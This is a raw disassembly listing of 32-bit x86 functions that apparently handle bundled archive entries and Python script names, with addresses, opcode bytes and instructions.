  401f5b:	8d 6c 24 4f          	lea    0x4f(%esp),%ebp
  401f5f:	8d 9c 24 4f 10 00 00 	lea    0x104f(%esp),%ebx
  401f66:	8b 38                	mov    (%eax),%edi
  401f68:	89 54 24 04          	mov    %edx,0x4(%esp)
  401f6c:	89 34 24             	mov    %esi,(%esp)
  401f6f:	89 44 24 3c          	mov    %eax,0x3c(%esp)
  401f73:	e8 40 89 00 00       	call   0x40a8b8
  401f78:	c7 44 24 04 a8 c1 40 	movl   $0x40c1a8,0x4(%esp)
  401f7f:	00 
  401f80:	89 34 24             	mov    %esi,(%esp)
  401f83:	e8 58 89 00 00       	call   0x40a8e0
  401f88:	89 2c 24             	mov    %ebp,(%esp)
  401f8b:	89 44 24 04          	mov    %eax,0x4(%esp)
  401f8f:	e8 24 89 00 00       	call   0x40a8b8
  401f94:	c7 44 24 04 a8 c1 40 	movl   $0x40c1a8,0x4(%esp)
  401f9b:	00 
  401f9c:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  401fa3:	e8 38 89 00 00       	call   0x40a8e0
  401fa8:	89 1c 24             	mov    %ebx,(%esp)
  401fab:	89 44 24 04          	mov    %eax,0x4(%esp)
  401faf:	e8 04 89 00 00       	call   0x40a8b8
  401fb4:	80 7c 24 4f 00       	cmpb   $0x0,0x4f(%esp)
  401fb9:	0f 84 4b 02 00 00    	je     0x40220a
  401fbf:	80 bc 24 4f 10 00 00 	cmpb   $0x0,0x104f(%esp)
  401fc6:	00 
  401fc7:	0f 84 3d 02 00 00    	je     0x40220a
  401fcd:	89 6c 24 04          	mov    %ebp,0x4(%esp)
  401fd1:	89 34 24             	mov    %esi,(%esp)
  401fd4:	e8 b7 0a 00 00       	call   0x402a90
  401fd9:	8d 87 68 10 00 00    	lea    0x1068(%edi),%eax
  401fdf:	89 5c 24 18          	mov    %ebx,0x18(%esp)
  401fe3:	c7 44 24 14 aa c1 40 	movl   $0x40c1aa,0x14(%esp)
  401fea:	00 
  401feb:	89 74 24 10          	mov    %esi,0x10(%esp)
  401fef:	c7 44 24 0c aa c1 40 	movl   $0x40c1aa,0xc(%esp)
  401ff6:	00 
  401ff7:	89 44 24 38          	mov    %eax,0x38(%esp)
  401ffb:	89 44 24 08          	mov    %eax,0x8(%esp)
  401fff:	8d 84 24 4f 20 00 00 	lea    0x204f(%esp),%eax
  402006:	c7 44 24 04 33 c2 40 	movl   $0x40c233,0x4(%esp)
  40200d:	00 
  40200e:	89 04 24             	mov    %eax,(%esp)
  402011:	e8 ea fe ff ff       	call   0x401f00
  402016:	85 c0                	test   %eax,%eax
  402018:	75 46                	jne    0x402060
  40201a:	89 3c 24             	mov    %edi,(%esp)
  40201d:	e8 7e 27 00 00       	call   0x4047a0
  402022:	83 f8 ff             	cmp    $0xffffffff,%eax
  402025:	0f 84 85 02 00 00    	je     0x4022b0
  40202b:	8d 84 24 4f 20 00 00 	lea    0x204f(%esp),%eax
  402032:	81 c7 68 20 00 00    	add    $0x2068,%edi
  402038:	89 5c 24 08          	mov    %ebx,0x8(%esp)
  40203c:	89 7c 24 04          	mov    %edi,0x4(%esp)
  402040:	89 04 24             	mov    %eax,(%esp)
  402043:	e8 b8 2a 00 00       	call   0x404b00
  402048:	83 f8 ff             	cmp    $0xffffffff,%eax
  40204b:	0f 84 5f 02 00 00    	je     0x4022b0
  402051:	31 c0                	xor    %eax,%eax
  402053:	81 c4 5c 50 00 00    	add    $0x505c,%esp
  402059:	5b                   	pop    %ebx
  40205a:	5e                   	pop    %esi
  40205b:	5f                   	pop    %edi
  40205c:	5d                   	pop    %ebp
  40205d:	c3                   	ret
  40205e:	66 90                	xchg   %ax,%ax
  402060:	8b 44 24 38          	mov    0x38(%esp),%eax
  402064:	89 5c 24 20          	mov    %ebx,0x20(%esp)
  402068:	c7 44 24 1c aa c1 40 	movl   $0x40c1aa,0x1c(%esp)
  40206f:	00 
  402070:	89 74 24 18          	mov    %esi,0x18(%esp)
  402074:	c7 44 24 14 aa c1 40 	movl   $0x40c1aa,0x14(%esp)
  40207b:	00 
  40207c:	c7 44 24 10 ac c1 40 	movl   $0x40c1ac,0x10(%esp)
  402083:	00 
  402084:	89 44 24 08          	mov    %eax,0x8(%esp)
  402088:	8d 84 24 4f 20 00 00 	lea    0x204f(%esp),%eax
  40208f:	c7 44 24 0c aa c1 40 	movl   $0x40c1aa,0xc(%esp)
  402096:	00 
  402097:	c7 44 24 04 af c1 40 	movl   $0x40c1af,0x4(%esp)
  40209e:	00 
  40209f:	89 04 24             	mov    %eax,(%esp)
  4020a2:	e8 59 fe ff ff       	call   0x401f00
  4020a7:	85 c0                	test   %eax,%eax
  4020a9:	0f 84 6b ff ff ff    	je     0x40201a
  4020af:	8b 44 24 38          	mov    0x38(%esp),%eax
  4020b3:	8d b4 24 4f 30 00 00 	lea    0x304f(%esp),%esi
  4020ba:	89 6c 24 10          	mov    %ebp,0x10(%esp)
  4020be:	c7 44 24 0c aa c1 40 	movl   $0x40c1aa,0xc(%esp)
  4020c5:	00 
  4020c6:	c7 44 24 04 be c1 40 	movl   $0x40c1be,0x4(%esp)
  4020cd:	00 
  4020ce:	89 34 24             	mov    %esi,(%esp)
  4020d1:	89 44 24 08          	mov    %eax,0x8(%esp)
  4020d5:	e8 26 fe ff ff       	call   0x401f00
  4020da:	85 c0                	test   %eax,%eax
  4020dc:	0f 85 9e 00 00 00    	jne    0x402180
  4020e2:	8b 7c 24 3c          	mov    0x3c(%esp),%edi
  4020e6:	8b 07                	mov    (%edi),%eax
  4020e8:	89 04 24             	mov    %eax,(%esp)
  4020eb:	e8 b0 26 00 00       	call   0x4047a0
  4020f0:	83 f8 ff             	cmp    $0xffffffff,%eax
  4020f3:	0f 84 df 00 00 00    	je     0x4021d8
  4020f9:	89 f8                	mov    %edi,%eax
  4020fb:	8b 7f 04             	mov    0x4(%edi),%edi
  4020fe:	8d 68 08             	lea    0x8(%eax),%ebp
  402101:	8b 44 24 3c          	mov    0x3c(%esp),%eax
  402105:	85 ff                	test   %edi,%edi
  402107:	8d 50 04             	lea    0x4(%eax),%edx
  40210a:	75 15                	jne    0x402121
  40210c:	e9 0f 01 00 00       	jmp    0x402220
  402111:	89 ea                	mov    %ebp,%edx
  402113:	83 c5 04             	add    $0x4,%ebp
  402116:	8b 7d fc             	mov    -0x4(%ebp),%edi
  402119:	85 ff                	test   %edi,%edi
  40211b:	0f 84 ff 00 00 00    	je     0x402220
  402121:	8d 47 68             	lea    0x68(%edi),%eax
  402124:	89 74 24 04          	mov    %esi,0x4(%esp)
  402128:	89 04 24             	mov    %eax,(%esp)
  40212b:	e8 b8 87 00 00       	call   0x40a8e8
  402130:	85 c0                	test   %eax,%eax
  402132:	75 dd                	jne    0x402111
  402134:	8b 77 08             	mov    0x8(%edi),%esi
  402137:	3b 77 0c             	cmp    0xc(%edi),%esi
  40213a:	0f 83 11 ff ff ff    	jae    0x402051
  402140:	8d 46 12             	lea    0x12(%esi),%eax
  402143:	89 5c 24 04          	mov    %ebx,0x4(%esp)
  402147:	89 04 24             	mov    %eax,(%esp)
  40214a:	e8 99 87 00 00       	call   0x40a8e8
  40214f:	85 c0                	test   %eax,%eax
  402151:	75 14                	jne    0x402167
  402153:	89 74 24 04          	mov    %esi,0x4(%esp)
  402157:	89 3c 24             	mov    %edi,(%esp)
  40215a:	e8 f1 f6 ff ff       	call   0x401850
  40215f:	85 c0                	test   %eax,%eax
  402161:	0f 85 8b 00 00 00    	jne    0x4021f2
  402167:	89 74 24 04          	mov    %esi,0x4(%esp)
  40216b:	89 3c 24             	mov    %edi,(%esp)
  40216e:	e8 5d f4 ff ff       	call   0x4015d0
  402173:	3b 47 0c             	cmp    0xc(%edi),%eax
  402176:	89 c6                	mov    %eax,%esi
  402178:	72 c6                	jb     0x402140
  40217a:	e9 d2 fe ff ff       	jmp    0x402051
  40217f:	90                   	nop
  402180:	8b 44 24 38          	mov    0x38(%esp),%eax
  402184:	89 6c 24 10          	mov    %ebp,0x10(%esp)
  402188:	c7 44 24 0c aa c1 40 	movl   $0x40c1aa,0xc(%esp)
  40218f:	00 
  402190:	c7 44 24 04 c9 c1 40 	movl   $0x40c1c9,0x4(%esp)
  402197:	00 
  402198:	89 34 24             	mov    %esi,(%esp)
  40219b:	89 44 24 08          	mov    %eax,0x8(%esp)
  40219f:	e8 5c fd ff ff       	call   0x401f00
  4021a4:	85 c0                	test   %eax,%eax
  4021a6:	0f 84 36 ff ff ff    	je     0x4020e2
  4021ac:	8b 44 24 38          	mov    0x38(%esp),%eax
  4021b0:	89 6c 24 10          	mov    %ebp,0x10(%esp)
  4021b4:	c7 44 24 0c aa c1 40 	movl   $0x40c1aa,0xc(%esp)
  4021bb:	00 
  4021bc:	c7 44 24 04 d4 c1 40 	movl   $0x40c1d4,0x4(%esp)
  4021c3:	00 
  4021c4:	89 34 24             	mov    %esi,(%esp)
  4021c7:	89 44 24 08          	mov    %eax,0x8(%esp)
  4021cb:	e8 30 fd ff ff       	call   0x401f00
  4021d0:	85 c0                	test   %eax,%eax
  4021d2:	0f 84 0a ff ff ff    	je     0x4020e2
  4021d8:	89 74 24 04          	mov    %esi,0x4(%esp)
  4021dc:	c7 04 24 db c1 40 00 	movl   $0x40c1db,(%esp)
  4021e3:	e8 28 fc ff ff       	call   0x401e10
  4021e8:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  4021ed:	e9 61 fe ff ff       	jmp    0x402053
  4021f2:	89 5c 24 04          	mov    %ebx,0x4(%esp)
  4021f6:	c7 04 24 4f c2 40 00 	movl   $0x40c24f,(%esp)
  4021fd:	e8 0e fc ff ff       	call   0x401e10
  402202:	89 3c 24             	mov    %edi,(%esp)
  402205:	e8 8e 86 00 00       	call   0x40a898
  40220a:	81 c4 5c 50 00 00    	add    $0x505c,%esp
  402210:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  402215:	5b                   	pop    %ebx
  402216:	5e                   	pop    %esi
  402217:	5f                   	pop    %edi
  402218:	5d                   	pop    %ebp
  402219:	c3                   	ret
  40221a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  402220:	c7 04 24 78 40 00 00 	movl   $0x4078,(%esp)
  402227:	89 54 24 38          	mov    %edx,0x38(%esp)
  40222b:	e8 20 86 00 00       	call   0x40a850
  402230:	85 c0                	test   %eax,%eax
  402232:	89 c7                	mov    %eax,%edi
  402234:	8b 54 24 38          	mov    0x38(%esp),%edx
  402238:	0f 84 a9 00 00 00    	je     0x4022e7
  40223e:	8d 40 68             	lea    0x68(%eax),%eax
  402241:	89 74 24 04          	mov    %esi,0x4(%esp)
  402245:	89 54 24 38          	mov    %edx,0x38(%esp)
  402249:	89 04 24             	mov    %eax,(%esp)
  40224c:	e8 67 86 00 00       	call   0x40a8b8
  402251:	8b 44 24 3c          	mov    0x3c(%esp),%eax
  402255:	8b 28                	mov    (%eax),%ebp
  402257:	8d 85 68 10 00 00    	lea    0x1068(%ebp),%eax
  40225d:	89 44 24 04          	mov    %eax,0x4(%esp)
  402261:	8d 87 68 10 00 00    	lea    0x1068(%edi),%eax
  402267:	89 04 24             	mov    %eax,(%esp)
  40226a:	e8 49 86 00 00       	call   0x40a8b8
  40226f:	8d 85 68 20 00 00    	lea    0x2068(%ebp),%eax
  402275:	89 44 24 04          	mov    %eax,0x4(%esp)
  402279:	8d 87 68 20 00 00    	lea    0x2068(%edi),%eax
  40227f:	89 04 24             	mov    %eax,(%esp)
  402282:	e8 31 86 00 00       	call   0x40a8b8
  402287:	8b 85 68 40 00 00    	mov    0x4068(%ebp),%eax
  40228d:	89 87 68 40 00 00    	mov    %eax,0x4068(%edi)
  402293:	89 3c 24             	mov    %edi,(%esp)
  402296:	e8 75 f6 ff ff       	call   0x401910
  40229b:	85 c0                	test   %eax,%eax
  40229d:	8b 54 24 38          	mov    0x38(%esp),%edx
  4022a1:	75 27                	jne    0x4022ca
  4022a3:	89 3a                	mov    %edi,(%edx)
  4022a5:	e9 8a fe ff ff       	jmp    0x402134
  4022aa:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  4022b0:	89 5c 24 04          	mov    %ebx,0x4(%esp)
  4022b4:	c7 04 24 3e c2 40 00 	movl   $0x40c23e,(%esp)
  4022bb:	e8 50 fb ff ff       	call   0x401e10
  4022c0:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  4022c5:	e9 89 fd ff ff       	jmp    0x402053
  4022ca:	89 74 24 04          	mov    %esi,0x4(%esp)
  4022ce:	c7 04 24 18 c2 40 00 	movl   $0x40c218,(%esp)
  4022d5:	e8 36 fb ff ff       	call   0x401e10
  4022da:	89 3c 24             	mov    %edi,(%esp)
  4022dd:	e8 b6 85 00 00       	call   0x40a898
  4022e2:	e9 f1 fe ff ff       	jmp    0x4021d8
  4022e7:	c7 04 24 f4 c1 40 00 	movl   $0x40c1f4,(%esp)
  4022ee:	e8 1d fb ff ff       	call   0x401e10
  4022f3:	e9 e0 fe ff ff       	jmp    0x4021d8
  4022f8:	90                   	nop
  4022f9:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  402300:	57                   	push   %edi
  402301:	56                   	push   %esi
  402302:	53                   	push   %ebx
  402303:	83 ec 10             	sub    $0x10,%esp
  402306:	8b 7c 24 20          	mov    0x20(%esp),%edi
  40230a:	8b 47 08             	mov    0x8(%edi),%eax
  40230d:	3b 47 0c             	cmp    0xc(%edi),%eax
  402310:	73 52                	jae    0x402364
  402312:	0f b6 50 11          	movzbl 0x11(%eax),%edx
  402316:	80 fa 64             	cmp    $0x64,%dl
  402319:	0f 94 c3             	sete   %bl
  40231c:	80 fa 78             	cmp    $0x78,%dl
  40231f:	0f 94 c1             	sete   %cl
  402322:	08 cb                	or     %cl,%bl
  402324:	74 22                	je     0x402348
  402326:	eb 48                	jmp    0x402370
  402328:	90                   	nop
  402329:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  402330:	0f b6 50 11          	movzbl 0x11(%eax),%edx
  402334:	80 fa 64             	cmp    $0x64,%dl
  402337:	0f 94 c1             	sete   %cl
  40233a:	80 fa 78             	cmp    $0x78,%dl
  40233d:	89 ce                	mov    %ecx,%esi
  40233f:	0f 94 c1             	sete   %cl
  402342:	89 f3                	mov    %esi,%ebx
  402344:	08 cb                	or     %cl,%bl
  402346:	75 28                	jne    0x402370
  402348:	83 ea 5a             	sub    $0x5a,%edx
  40234b:	81 e2 f7 00 00 00    	and    $0xf7,%edx
  402351:	74 1d                	je     0x402370
  402353:	89 44 24 04          	mov    %eax,0x4(%esp)
  402357:	89 3c 24             	mov    %edi,(%esp)
  40235a:	e8 71 f2 ff ff       	call   0x4015d0
  40235f:	39 47 0c             	cmp    %eax,0xc(%edi)
  402362:	77 cc                	ja     0x402330
  402364:	83 c4 10             	add    $0x10,%esp
  402367:	31 c0                	xor    %eax,%eax
  402369:	5b                   	pop    %ebx
  40236a:	5e                   	pop    %esi
  40236b:	5f                   	pop    %edi
  40236c:	c3                   	ret
  40236d:	8d 76 00             	lea    0x0(%esi),%esi
  402370:	83 c4 10             	add    $0x10,%esp
  402373:	b8 01 00 00 00       	mov    $0x1,%eax
  402378:	5b                   	pop    %ebx
  402379:	5e                   	pop    %esi
  40237a:	5f                   	pop    %edi
  40237b:	c3                   	ret
  40237c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  402380:	55                   	push   %ebp
  402381:	57                   	push   %edi
  402382:	31 c0                	xor    %eax,%eax
  402384:	56                   	push   %esi
  402385:	53                   	push   %ebx
  402386:	b9 14 00 00 00       	mov    $0x14,%ecx
  40238b:	83 ec 6c             	sub    $0x6c,%esp
  40238e:	8b b4 24 80 00 00 00 	mov    0x80(%esp),%esi
  402395:	8d 6c 24 10          	lea    0x10(%esp),%ebp
  402399:	89 ef                	mov    %ebp,%edi
  40239b:	8b 5e 08             	mov    0x8(%esi),%ebx
  40239e:	3b 5e 0c             	cmp    0xc(%esi),%ebx
  4023a1:	f3 ab                	rep stos %eax,%es:(%edi)
  4023a3:	89 74 24 10          	mov    %esi,0x10(%esp)
  4023a7:	72 22                	jb     0x4023cb
  4023a9:	e9 8e 00 00 00       	jmp    0x40243c
  4023ae:	66 90                	xchg   %ax,%ax
  4023b0:	3c 78                	cmp    $0x78,%al
  4023b2:	74 26                	je     0x4023da
  4023b4:	3c 64                	cmp    $0x64,%al
  4023b6:	74 3d                	je     0x4023f5
  4023b8:	89 5c 24 04          	mov    %ebx,0x4(%esp)
  4023bc:	89 34 24             	mov    %esi,(%esp)
  4023bf:	e8 0c f2 ff ff       	call   0x4015d0
  4023c4:	39 46 0c             	cmp    %eax,0xc(%esi)
  4023c7:	89 c3                	mov    %eax,%ebx
  4023c9:	76 45                	jbe    0x402410
  4023cb:	0f b6 43 11          	movzbl 0x11(%ebx),%eax
  4023cf:	8d 50 a6             	lea    -0x5a(%eax),%edx
  4023d2:	81 e2 f7 00 00 00    	and    $0xf7,%edx
  4023d8:	75 d6                	jne    0x4023b0
  4023da:	89 5c 24 04          	mov    %ebx,0x4(%esp)
  4023de:	89 34 24             	mov    %esi,(%esp)
  4023e1:	e8 6a f4 ff ff       	call   0x401850
  4023e6:	85 c0                	test   %eax,%eax
  4023e8:	74 ce                	je     0x4023b8
  4023ea:	8b 54 24 14          	mov    0x14(%esp),%edx
  4023ee:	be ff ff ff ff       	mov    $0xffffffff,%esi
  4023f3:	eb 21                	jmp    0x402416
  4023f5:	8d 53 12             	lea    0x12(%ebx),%edx
  4023f8:	89 e8                	mov    %ebp,%eax
  4023fa:	e8 41 fb ff ff       	call   0x401f40
  4023ff:	83 f8 ff             	cmp    $0xffffffff,%eax
  402402:	75 b4                	jne    0x4023b8
  402404:	eb e4                	jmp    0x4023ea
  402406:	8d 76 00             	lea    0x0(%esi),%esi
  402409:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  402410:	8b 54 24 14          	mov    0x14(%esp),%edx
  402414:	31 f6                	xor    %esi,%esi
  402416:	85 d2                	test   %edx,%edx
  402418:	8d 5c 24 18          	lea    0x18(%esp),%ebx
  40241c:	74 14                	je     0x402432
  40241e:	66 90                	xchg   %ax,%ax
  402420:	89 14 24             	mov    %edx,(%esp)
  402423:	83 c3 04             	add    $0x4,%ebx
  402426:	e8 15 f9 ff ff       	call   0x401d40
  40242b:	8b 53 fc             	mov    -0x4(%ebx),%edx
  40242e:	85 d2                	test   %edx,%edx
  402430:	75 ee                	jne    0x402420
  402432:	83 c4 6c             	add    $0x6c,%esp
  402435:	89 f0                	mov    %esi,%eax
  402437:	5b                   	pop    %ebx
  402438:	5e                   	pop    %esi
  402439:	5f                   	pop    %edi
  40243a:	5d                   	pop    %ebp
  40243b:	c3                   	ret
  40243c:	31 f6                	xor    %esi,%esi
  40243e:	eb f2                	jmp    0x402432
  402440:	55                   	push   %ebp
  402441:	57                   	push   %edi
  402442:	b8 2c 10 00 00       	mov    $0x102c,%eax
  402447:	56                   	push   %esi
  402448:	53                   	push   %ebx
  402449:	e8 92 81 00 00       	call   0x40a5e0
  40244e:	29 c4                	sub    %eax,%esp
  402450:	8b b4 24 40 10 00 00 	mov    0x1040(%esp),%esi
  402457:	8d 7c 24 20          	lea    0x20(%esp),%edi
  40245b:	8b 5e 08             	mov    0x8(%esi),%ebx
  40245e:	c7 04 24 64 c2 40 00 	movl   $0x40c264,(%esp)
  402465:	ff 15 78 20 41 00    	call   *0x412078
  40246b:	3b 5e 0c             	cmp    0xc(%esi),%ebx
  40246e:	89 44 24 18          	mov    %eax,0x18(%esp)
  402472:	72 23                	jb     0x402497
  402474:	e9 e7 00 00 00       	jmp    0x402560
  402479:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  402480:	89 5c 24 04          	mov    %ebx,0x4(%esp)
  402484:	89 34 24             	mov    %esi,(%esp)
  402487:	e8 44 f1 ff ff       	call   0x4015d0
  40248c:	39 46 0c             	cmp    %eax,0xc(%esi)
  40248f:	89 c3                	mov    %eax,%ebx
  402491:	0f 86 c9 00 00 00    	jbe    0x402560
  402497:	80 7b 11 73          	cmpb   $0x73,0x11(%ebx)
  40249b:	75 e3                	jne    0x402480
  40249d:	89 5c 24 04          	mov    %ebx,0x4(%esp)
  4024a1:	89 34 24             	mov    %esi,(%esp)
  4024a4:	e8 67 f1 ff ff       	call   0x401610
  4024a9:	89 c5                	mov    %eax,%ebp
  4024ab:	8d 43 12             	lea    0x12(%ebx),%eax
  4024ae:	89 3c 24             	mov    %edi,(%esp)
  4024b1:	89 44 24 04          	mov    %eax,0x4(%esp)
  4024b5:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  4024b9:	e8 fa 83 00 00       	call   0x40a8b8
  4024be:	89 fa                	mov    %edi,%edx
  4024c0:	8b 0a                	mov    (%edx),%ecx
  4024c2:	83 c2 04             	add    $0x4,%edx
  4024c5:	8d 81 ff fe fe fe    	lea    -0x1010101(%ecx),%eax
  4024cb:	f7 d1                	not    %ecx
  4024cd:	21 c8                	and    %ecx,%eax
  4024cf:	25 80 80 80 80       	and    $0x80808080,%eax
  4024d4:	74 ea                	je     0x4024c0
  4024d6:	89 c1                	mov    %eax,%ecx
  4024d8:	c1 e9 10             	shr    $0x10,%ecx
  4024db:	a9 80 80 00 00       	test   $0x8080,%eax
  4024e0:	0f 44 c1             	cmove  %ecx,%eax
  4024e3:	8d 4a 02             	lea    0x2(%edx),%ecx
  4024e6:	0f 44 d1             	cmove  %ecx,%edx
  4024e9:	00 c0                	add    %al,%al
  4024eb:	a1 74 e6 41 00       	mov    0x41e674,%eax
  4024f0:	83 da 03             	sbb    $0x3,%edx
  4024f3:	c7 02 2e 70 79 00    	movl   $0x79702e,(%edx)
  4024f9:	89 3c 24             	mov    %edi,(%esp)
  4024fc:	85 c0                	test   %eax,%eax
  4024fe:	74 50                	je     0x402550
  402500:	ff 15 50 20 41 00    	call   *0x412050
  402506:	89 c2                	mov    %eax,%edx
  402508:	8b 44 24 18          	mov    0x18(%esp),%eax
  40250c:	89 54 24 08          	mov    %edx,0x8(%esp)
  402510:	89 54 24 14          	mov    %edx,0x14(%esp)
  402514:	c7 44 24 04 6d c2 40 	movl   $0x40c26d,0x4(%esp)
  40251b:	00 
  40251c:	89 04 24             	mov    %eax,(%esp)
  40251f:	ff 15 58 20 41 00    	call   *0x412058
  402525:	8b 54 24 14          	mov    0x14(%esp),%edx
  402529:	89 14 24             	mov    %edx,(%esp)
  40252c:	ff 15 b8 20 41 00    	call   *0x4120b8
  402532:	89 2c 24             	mov    %ebp,(%esp)
  402535:	ff 15 54 20 41 00    	call   *0x412054
  40253b:	85 c0                	test   %eax,%eax
  40253d:	75 31                	jne    0x402570
  40253f:	89 2c 24             	mov    %ebp,(%esp)
  402542:	e8 51 83 00 00       	call   0x40a898
  402547:	e9 34 ff ff ff       	jmp    0x402480
  40254c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  402550:	ff 15 34 20 41 00    	call   *0x412034
  402556:	89 c2                	mov    %eax,%edx
  402558:	eb ae                	jmp    0x402508
  40255a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  402560:	81 c4 2c 10 00 00    	add    $0x102c,%esp
  402566:	31 c0                	xor    %eax,%eax
  402568:	5b                   	pop    %ebx
  402569:	5e                   	pop    %esi
  40256a:	5f                   	pop    %edi
  40256b:	5d                   	pop    %ebp
  40256c:	c3                   	ret
  40256d:	8d 76 00             	lea    0x0(%esi),%esi
  402570:	89 44 24 08          	mov    %eax,0x8(%esp)
  402574:	89 44 24 14          	mov    %eax,0x14(%esp)
  402578:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  40257c:	c7 04 24 76 c2 40 00 	movl   $0x40c276,(%esp)
  402583:	89 44 24 04          	mov    %eax,0x4(%esp)
  402587:	e8 84 f8 ff ff       	call   0x401e10
  40258c:	8b 44 24 14          	mov    0x14(%esp),%eax
  402590:	81 c4 2c 10 00 00    	add    $0x102c,%esp
  402596:	5b                   	pop    %ebx
  402597:	5e                   	pop    %esi
  402598:	5f                   	pop    %edi
  402599:	5d                   	pop    %ebp
  40259a:	c3                   	ret
  40259b:	90                   	nop
  40259c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  4025a0:	57                   	push   %edi
  4025a1:	56                   	push   %esi
  4025a2:	53                   	push   %ebx
  4025a3:	83 ec 10             	sub    $0x10,%esp
  4025a6:	c7 04 24 64 c2 40 00 	movl   $0x40c264,(%esp)
  4025ad:	ff 15 78 20 41 00    	call   *0x412078
  4025b3:	85 c0                	test   %eax,%eax
  4025b5:	0f 84 b5 00 00 00    	je     0x402670
  4025bb:	89 04 24             	mov    %eax,(%esp)
  4025be:	ff 15 60 20 41 00    	call   *0x412060
  4025c4:	8b 54 24 20          	mov    0x20(%esp),%edx
  4025c8:	89 04 24             	mov    %eax,(%esp)
  4025cb:	89 54 24 04          	mov    %edx,0x4(%esp)
  4025cf:	ff 15 94 20 41 00    	call   *0x412094
  4025d5:	85 c0                	test   %eax,%eax
  4025d7:	89 c3                	mov    %eax,%ebx
  4025d9:	0f 84 a1 00 00 00    	je     0x402680
  4025df:	c7 44 24 04 86 c2 40 	movl   $0x40c286,0x4(%esp)
  4025e6:	00 
  4025e7:	89 04 24             	mov    %eax,(%esp)
  4025ea:	ff 15 5c 20 41 00    	call   *0x41205c
  4025f0:	85 c0                	test   %eax,%eax
  4025f2:	89 c6                	mov    %eax,%esi
  4025f4:	0f 84 96 00 00 00    	je     0x402690
  4025fa:	ff 15 90 20 41 00    	call   *0x412090
  402600:	89 34 24             	mov    %esi,(%esp)
  402603:	bf ff ff ff ff       	mov    $0xffffffff,%edi
  402608:	ff 15 64 20 41 00    	call   *0x412064
  40260e:	8b 54 24 24          	mov    0x24(%esp),%edx
  402612:	89 02                	mov    %eax,(%edx)
  402614:	ff 15 8c 20 41 00    	call   *0x41208c
  40261a:	85 c0                	test   %eax,%eax
  40261c:	74 27                	je     0x402645
  40261e:	89 1c 24             	mov    %ebx,(%esp)
  402621:	ff 15 b8 20 41 00    	call   *0x4120b8
  402627:	89 34 24             	mov    %esi,(%esp)
  40262a:	ff 15 b8 20 41 00    	call   *0x4120b8
  402630:	ff 15 88 20 41 00    	call   *0x412088
  402636:	ff 15 90 20 41 00    	call   *0x412090
  40263c:	83 c4 10             	add    $0x10,%esp
  40263f:	89 f8                	mov    %edi,%eax
  402641:	5b                   	pop    %ebx
  402642:	5e                   	pop    %esi
  402643:	5f                   	pop    %edi
  402644:	c3                   	ret
  402645:	89 1c 24             	mov    %ebx,(%esp)
  402648:	31 ff                	xor    %edi,%edi
  40264a:	ff 15 b8 20 41 00    	call   *0x4120b8
  402650:	89 34 24             	mov    %esi,(%esp)
  402653:	ff 15 b8 20 41 00    	call   *0x4120b8
  402659:	ff 15 90 20 41 00    	call   *0x412090
  40265f:	83 c4 10             	add    $0x10,%esp
  402662:	89 f8                	mov    %edi,%eax
  402664:	5b                   	pop    %ebx
  402665:	5e                   	pop    %esi
  402666:	5f                   	pop    %edi
  402667:	c3                   	ret
  402668:	90                   	nop
  402669:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  402670:	31 f6                	xor    %esi,%esi
  402672:	31 db                	xor    %ebx,%ebx
  402674:	bf ff ff ff ff       	mov    $0xffffffff,%edi
  402679:	eb a3                	jmp    0x40261e
  40267b:	90                   	nop
  40267c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  402680:	31 f6                	xor    %esi,%esi
  402682:	bf fe ff ff ff       	mov    $0xfffffffe,%edi
  402687:	eb 95                	jmp    0x40261e
  402689:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  402690:	bf ff ff ff ff       	mov    $0xffffffff,%edi
  402695:	eb 87                	jmp    0x40261e
  402697:	89 f6                	mov    %esi,%esi
  402699:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  4026a0:	53                   	push   %ebx
  4026a1:	83 ec 18             	sub    $0x18,%esp
  4026a4:	8b 5c 24 20          	mov    0x20(%esp),%ebx
  4026a8:	c7 44 24 04 87 c2 40 	movl   $0x40c287,0x4(%esp)
  4026af:	00 
  4026b0:	89 1c 24             	mov    %ebx,(%esp)
  4026b3:	e8 d8 f6 ff ff       	call   0x401d90
  4026b8:	85 c0                	test   %eax,%eax
  4026ba:	74 34                	je     0x4026f0
  4026bc:	81 c3 68 30 00 00    	add    $0x3068,%ebx
  4026c2:	89 44 24 08          	mov    %eax,0x8(%esp)
  4026c6:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  4026cd:	89 5c 24 04          	mov    %ebx,0x4(%esp)
  4026d1:	e8 8a 04 00 00       	call   0x402b60
  4026d6:	89 c3                	mov    %eax,%ebx
  4026d8:	89 04 24             	mov    %eax,(%esp)
  4026db:	e8 10 2c 00 00       	call   0x4052f0
  4026e0:	89 5c 24 20          	mov    %ebx,0x20(%esp)
  4026e4:	83 c4 18             	add    $0x18,%esp
  4026e7:	5b                   	pop    %ebx
  4026e8:	e9 ab 81 00 00       	jmp    0x40a898
  4026ed:	8d 76 00             	lea    0x0(%esi),%esi
  4026f0:	83 c4 18             	add    $0x18,%esp
  4026f3:	5b                   	pop    %ebx
  4026f4:	c3                   	ret
  4026f5:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  4026f9:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  402700:	53                   	push   %ebx
  402701:	83 ec 18             	sub    $0x18,%esp
  402704:	8b 5c 24 20          	mov    0x20(%esp),%ebx
  402708:	89 1c 24             	mov    %ebx,(%esp)
  40270b:	e8 30 14 00 00       	call   0x403b40
